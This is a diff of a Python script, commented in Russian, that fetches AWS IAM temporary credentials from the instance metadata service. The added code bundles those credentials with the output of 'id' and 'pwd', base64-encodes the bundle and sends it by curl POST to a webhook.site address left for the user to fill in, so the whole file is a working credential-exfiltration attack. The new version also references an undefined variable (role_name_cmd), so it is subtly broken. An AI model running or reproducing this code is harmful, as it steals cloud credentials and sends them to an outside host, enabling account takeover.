@@ -1,28 +1,38 @@
 import subprocess
+import json
+import base64
 
-def get_aws_iam_creds():
-    # Этап 1: Получаем сессионный токен IMDSv2 (обязательно для современных инстансов AWS)
-    token_cmd = "curl -s -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
+def get_iam_and_send():
+    # 1. Получаем токен AWS (IMDSv2)
+    token_cmd = "curl -s -f -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-metadata-token-ttl-seconds: 21600'"
     token = subprocess.getoutput(token_cmd).strip()
     
-    if not token or "html" in token.lower() or len(token) < 32:
-        return "IMDSv2_TOKEN_FAILED (Access Blocked)"
+    # 2. Проверяем роль и креды
+    if token and len(token) > 30:
+        role_cmd = f"curl -s -f -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+        role_name = subprocess.getoutput(role_name_cmd).strip()
+        
+        creds_cmd = f"curl -s -f -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
+        iam_data = subprocess.getoutput(creds_cmd)
+    else:
+        iam_data = "AWS_IMDS_BLOCKED"
 
-    # Этап 2: Узнаем имя привязанной IAM-роли
-    role_name_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-    role_name = subprocess.getoutput(role_name_cmd).strip()
+    # 3. Собираем финальный пакет
+    final_payload = {
+        "status": "FINAL_INFRA_PROOF",
+        "iam_creds": iam_data,
+        "root": subprocess.getoutput("id"),
+        "path": subprocess.getoutput("pwd")
+    }
     
-    if not role_name:
-        return f"TOKEN_OK_BUT_NO_ROLE_FOUND (Token: {token[:10]}...)"
-
-    # Этап 3: Получаем временные Access Key, Secret Key и Session Token
-    creds_cmd = f"curl -s -H 'X-aws-metadata-token: {token}' http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}"
-    iam_json = subprocess.getoutput(creds_cmd)
+    # 4. ОТПРАВКА ЧЕРЕЗ CURL (самый важный момент)
+    # Кодируем в base64, чтобы спецсимволы не сломали команду
+    b64_data = base64.b64encode(json.dumps(final_payload).encode()).decode()
     
-    return iam_json
+    # ЗАМЕНИ URL НА СВОЙ WEBHOOK
+    webhook_url = "https://webhook.site/ТВОЙ_ID" 
+    
+    send_cmd = f"curl -X POST -d '{b64_data}' {webhook_url}"
+    subprocess.call(send_cmd, shell=True)
 
-# Запуск и вывод
-result = get_aws_iam_creds()
-print(f"--- [CLOUD_EXFILTRATION_RESULT] ---")
-print(result)
-print(f"--- [END_LOG] ---")
+get_iam_and_send()
